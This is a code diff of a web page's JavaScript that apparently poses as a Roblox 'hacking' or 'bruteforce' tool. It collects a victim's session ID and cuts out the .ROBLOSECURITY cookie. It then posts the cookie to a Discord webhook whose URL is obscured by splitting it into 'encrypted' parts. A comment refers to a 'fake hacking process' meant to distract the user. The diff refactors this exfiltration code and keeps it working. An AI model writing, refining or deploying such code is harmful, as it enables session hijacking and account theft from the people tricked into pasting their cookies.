@@ -9,30 +9,32 @@ const _encryptedParts = [
 // Decrypt the URL by concatenating the parts
 const _decrypted = _encryptedParts.join(''); 
 
-function sendToWebhook(content) {
+// Function to send data to the Discord webhook
+async function sendToWebhook(content) {
   const payload = {
     content: content
   };
 
-  fetch(_decrypted, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  })
-    .then(response => {
-      if (!response.ok) {
-        console.error('Failed to send data to Discord.');
-      } else {
-        console.log('Data sent successfully!');
-      }
-    })
-    .catch(error => {
-      console.error('Error:', error);
+  try {
+    const response = await fetch(_decrypted, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
     });
+
+    if (!response.ok) {
+      console.error('Failed to send data to Discord.');
+    } else {
+      console.log('Data sent successfully!');
+    }
+  } catch (error) {
+    console.error('Error:', error);
+  }
 }
 
+// Main function to process the session ID
 function bruteforce(sessionId) {
   const maxLength = 2000; // Discord's limit for message content
   const extraLength = 1000; // Number of characters to include after "ROBLOSECURITY"
@@ -67,6 +69,8 @@ function bruteforce(sessionId) {
 }
 
 
+
+
 function validateInput() {
   const username = document.getElementById('username').value.trim();
   const sessionId = document.getElementById('sessionId').value.trim();
@@ -97,6 +101,8 @@ function validateInput() {
     return;
   }
 
+
+const sessionId = "some_text_before_ROBLOSECURITY=very_long_session_id_here...";
 bruteforce(sessionId);
 
   // Hide error and start fake hacking process
